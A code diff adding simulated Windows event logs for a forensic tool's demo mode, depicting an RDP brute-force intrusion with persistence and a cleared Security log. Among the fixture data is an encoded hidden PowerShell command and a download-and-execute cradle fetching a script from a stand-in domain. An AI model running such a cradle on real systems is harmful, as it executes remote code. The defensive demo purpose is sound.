@@ -502,3 +502,217 @@ export function getDemoArtifactData(category, os = 'windows') {
   const osKey = os === 'windows' ? 'windows' : 'linux'
   return { records: generator ? generator(osKey) : [] }
 }
+
+/* -------------------------------------------------------------------------- */
+/* WINDOWS EVENT LOGS                                                          */
+/* -------------------------------------------------------------------------- */
+
+/*
+ * The same intrusion seen from the Windows logs: a password spray over RDP
+ * from a Tor exit node, a night-time RDP logon right after it, an encoded
+ * PowerShell download cradle, a service and a scheduled task for persistence,
+ * a new local admin, then the Security log cleared. Normal office logons and
+ * machine noise (service logons) surround it.
+ * Each row: [channel, recordId, eventId, daysAgo, hour, minute, data]
+ */
+const ATTACKER_IP = '185.220.101.47'
+const EVENT_LOG_ROWS = [
+  [
+    'Security',
+    9001,
+    4624,
+    6,
+    9,
+    2,
+    { TargetUserName: 'm.rossi', TargetDomainName: 'CORP', LogonType: '2', TargetLogonId: '0x1a2b' },
+  ],
+  ['Security', 9002, 4672, 6, 9, 2, { SubjectUserName: 'm.rossi', SubjectLogonId: '0x1a2b' }],
+  ['Security', 9003, 4634, 6, 17, 48, { TargetUserName: 'm.rossi', TargetLogonId: '0x1a2b', LogonType: '2' }],
+  [
+    'Security',
+    9004,
+    4624,
+    6,
+    3,
+    10,
+    { TargetUserName: 'SYSTEM', TargetDomainName: 'NT AUTHORITY', LogonType: '5', TargetLogonId: '0x3e7' },
+  ],
+  ...Array.from({ length: 14 }, (_, i) => [
+    'Security',
+    9100 + i,
+    4625,
+    3,
+    2,
+    i,
+    {
+      TargetUserName: i % 2 ? 'admin' : 'administrator',
+      LogonType: '10',
+      IpAddress: ATTACKER_IP,
+      Status: '0xc000006d',
+    },
+  ]),
+  [
+    'Security',
+    9120,
+    4624,
+    3,
+    2,
+    16,
+    {
+      TargetUserName: 'administrator',
+      TargetDomainName: 'WKS-042',
+      LogonType: '10',
+      IpAddress: ATTACKER_IP,
+      TargetLogonId: '0x9f00',
+    },
+  ],
+  ['Security', 9121, 4672, 3, 2, 16, { SubjectUserName: 'administrator', SubjectLogonId: '0x9f00' }],
+  [
+    'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational',
+    410,
+    1149,
+    3,
+    2,
+    16,
+    { Param1: 'administrator', Param2: 'WKS-042', Param3: ATTACKER_IP },
+  ],
+  [
+    'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',
+    820,
+    21,
+    3,
+    2,
+    16,
+    { User: 'WKS-042\\administrator', SessionID: '3', Address: ATTACKER_IP },
+  ],
+  [
+    'Security',
+    9122,
+    4688,
+    3,
+    2,
+    19,
+    {
+      SubjectUserName: 'administrator',
+      NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+      CommandLine:
+        'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
+    },
+  ],
+  [
+    'Microsoft-Windows-PowerShell/Operational',
+    5310,
+    4104,
+    3,
+    2,
+    19,
+    {
+      MessageNumber: '1',
+      MessageTotal: '1',
+      ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://cdn-update-service.top/a.ps1')",
+    },
+  ],
+  [
+    'System',
+    7702,
+    7045,
+    3,
+    2,
+    23,
+    {
+      ServiceName: 'WinUpdSvc',
+      ImagePath: 'C:\\Users\\Public\\svchost_upd.exe',
+      ServiceType: 'user mode service',
+      StartType: 'auto start',
+      AccountName: 'LocalSystem',
+    },
+  ],
+  ['Security', 9123, 4698, 3, 2, 25, { SubjectUserName: 'administrator', TaskName: '\\Microsoft\\Windows\\WinUpd' }],
+  [
+    'Security',
+    9124,
+    4720,
+    3,
+    2,
+    27,
+    { TargetUserName: 'support', TargetDomainName: 'WKS-042', SubjectUserName: 'administrator' },
+  ],
+  [
+    'Security',
+    9125,
+    4732,
+    3,
+    2,
+    28,
+    {
+      MemberSid: 'S-1-5-21-1004-1001',
+      TargetUserName: 'Administrators',
+      TargetSid: 'S-1-5-32-544',
+      SubjectUserName: 'administrator',
+    },
+  ],
+  ['Microsoft-Windows-Windows Defender/Operational', 1201, 5001, 3, 2, 30, {}],
+  ['Security', 9126, 1102, 3, 2, 41, { SubjectUserName: 'administrator', SubjectDomainName: 'WKS-042' }],
+  ['Security', 9127, 4634, 3, 2, 44, { TargetUserName: 'administrator', TargetLogonId: '0x9f00', LogonType: '10' }],
+  [
+    'Security',
+    9130,
+    4624,
+    1,
+    8,
+    55,
+    { TargetUserName: 'm.rossi', TargetDomainName: 'CORP', LogonType: '2', TargetLogonId: '0x2c3d' },
+  ],
+  ['System', 7710, 6005, 1, 8, 50, {}],
+]
+
+const DEMO_CHANNEL_SPANS = {
+  Security: [7, 0],
+  System: [12, 0],
+  'Microsoft-Windows-PowerShell/Operational': [9, 0],
+  'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational': [20, 1],
+  'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational': [20, 1],
+  'Microsoft-Windows-Windows Defender/Operational': [30, 0],
+}
+
+/**
+ * Demonstration event logs: `{ [channel]: { events, meta } }`, the shape
+ * Event Logs tab stores. Every channel's coverage runs to today, except the
+ * Security log, which is silent between the clear and the next morning.
+ */
+export function getDemoEventLogData() {
+  const importedAt = new Date().toISOString()
+  const channels = {}
+  for (const [channel, recordId, eventId, days, hour, minute, data] of EVENT_LOG_ROWS) {
+    const slot = (channels[channel] ??= { events: [] })
+    slot.events.push({
+      id: `evt:${channel}:${recordId}`,
+      time: daysAgoAt(days, hour, minute),
+      eventId,
+      channel,
+      provider: '',
+      computer: 'WKS-042',
+      recordId,
+      level: 0,
+      data,
+    })
+  }
+  for (const [channel, slot] of Object.entries(channels)) {
+    const [firstDays, lastDays] = DEMO_CHANNEL_SPANS[channel] ?? [7, 0]
+    slot.events.sort((a, b) => b.time - a.time)
+    slot.meta = {
+      fileName: 'Demo data',
+      format: 'demo',
+      importedAt,
+      rows: slot.events.length,
+      total: slot.events.length * 37,
+      kept: slot.events.length,
+      dropped: 0,
+      recovered: 0,
+      first: daysAgoAt(firstDays, 0, 5),
+      last: daysAgoAt(lastDays, 9, 30),
+      gaps: channel === 'Security' ? [[daysAgoAt(3, 2, 41), daysAgoAt(1, 8, 55)]] : [],
+    }
+  }
+  return channels
+}
